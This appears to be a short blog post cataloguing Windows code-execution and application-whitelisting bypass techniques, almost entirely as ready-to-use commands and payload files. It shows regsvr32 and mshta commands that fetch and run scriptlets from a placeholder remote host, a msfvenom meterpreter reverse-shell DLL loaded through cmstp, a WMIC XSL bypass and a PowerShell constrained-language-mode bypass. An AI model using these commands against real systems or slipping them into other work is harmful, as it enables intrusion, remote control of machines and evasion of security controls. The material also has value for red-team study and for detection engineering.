---
title: Windows Code Execution
date: 2024-12-13T10:38:28+08:00
draft: false
url: /posts/2024-12-13/Windows-Code-Execution
tags:
  - Windows
  - Code Execution
slug: English-Preview
---
> Windows Code Execution
> <!--more-->
# regsvr32

m.sct

```xml
<?XML version="1.0"?>
<scriptlet>
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
    ]]>
</script>
</registration>
</scriptlet>
```

Execute

```cmd
regsvr32.exe /s /i:http://ip/m.sct scrobj.dll
```

# MSHTA

m.sct

```xml
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>

<public>
    <method name="Exec"></method>
</public>

<script language="JScript">
<![CDATA[
	function Exec()	{
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	}
]]>
</script>
</scriptlet>
```

Execute

```powershell
# from powershell
cmd /c start /b mshta.exe "javascript:a=(GetObject('script:http://ip/m.sct')).Exec();close();"

mshta.exe "javascript:a=(GetObject('script:http://ip/m.sct')).Exec();close();"

# from cmd
mshta.exe javascript:a=(GetObject('script:http://ip/m.sct')).Exec();close();
```

## HTA

m.hta

```html
<html>
<head>
<script language="VBScript"> 
    Sub RunProgram
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "calc.exe"
    End Sub
RunProgram()
</script>
</head> 
<body>
    Nothing to see here..
</body>
</html>
```

Execute

```cmd
mshta.exe http://ip/m.hta
```

# Control Panel Item

The .cpl file needs to export a function `CplApplet` in order to be recognized by Windows as a Control Panel item.

Once the DLL is compiled and renamed to .CPL, it can simply be double clicked and executed like a regular Windows .exe file.

Once the DLL is compiled, use [CFF Explorer](https://ntcore.com/explorer-suite/) to see the exported function `Cplapplet`

```cpp
// Windows 10 Visual Studio 2022 Build
// dllmain.cpp : Defines the entry point for the DLL application.
// #include "stdafx.h"
#include "pch.h"
#include <Windows.h>

//Cplapplet
extern "C" __declspec(dllexport) LONG Cplapplet(
    HWND hwndCpl,
    UINT msg,
    LPARAM lParam1,
    LPARAM lParam2
)
{
    MessageBoxA(NULL, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
    return 1;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            {
                Cplapplet(NULL, NULL, NULL, NULL);
            }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

# CMSTP

[cmstp | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/cmstp)

Generating the a reverse shell payload as a DLL

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=8888 -f dll > /root/desktop/evil.dll
```

Creating a file that will be loaded by CSMTP.exe binary that will in turn load our evil.dll

f.inf

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
path to\evil.dll
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="cmstp"
ShortSvcName="cmstp"
```

Invoking the payload

```cmd
cmstp.exe /s .\f.inf
```

# Forfiles Indirect Command Execution

当前目录下，找到 `evil.exe`，就执行`evil.exe`

```cmd
forfiles /m evil.exe /c evil.exe
```

指定目录下，找到 `evil.exe`，就执行`evil.exe`

```cmd
forfiles /p path /m evil.exe /c evil.exe
```

# Application Whitelisting Bypass with WMIC and XSL

evil.xsl

```xml
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("calc");
	]]> </ms:script>
</stylesheet>
```

Invoke any wmic command now and specify /format pointing to the evil.xsl

```cmd
wmic os get /FORMAT:"evil.xsl"
```

# Powershell Without Powershell.exe

## [Github | PowerShdll](https://github.com/p3nt4/PowerShdll)

```powershell
rundll32.exe PowerShdll.dll,main
```

## SyncAppvPublishingServer

```powershell
# from PowerShell
SyncAppvPublishingServer.vbs break; [command]

SyncAppvPublishingServer.exe break; [command]
```

## Powershell Constrained Language Mode Bypass

```powershell
$a = [powershell]::Create(); $a.AddCommand('command'); $a.Invoke()
```

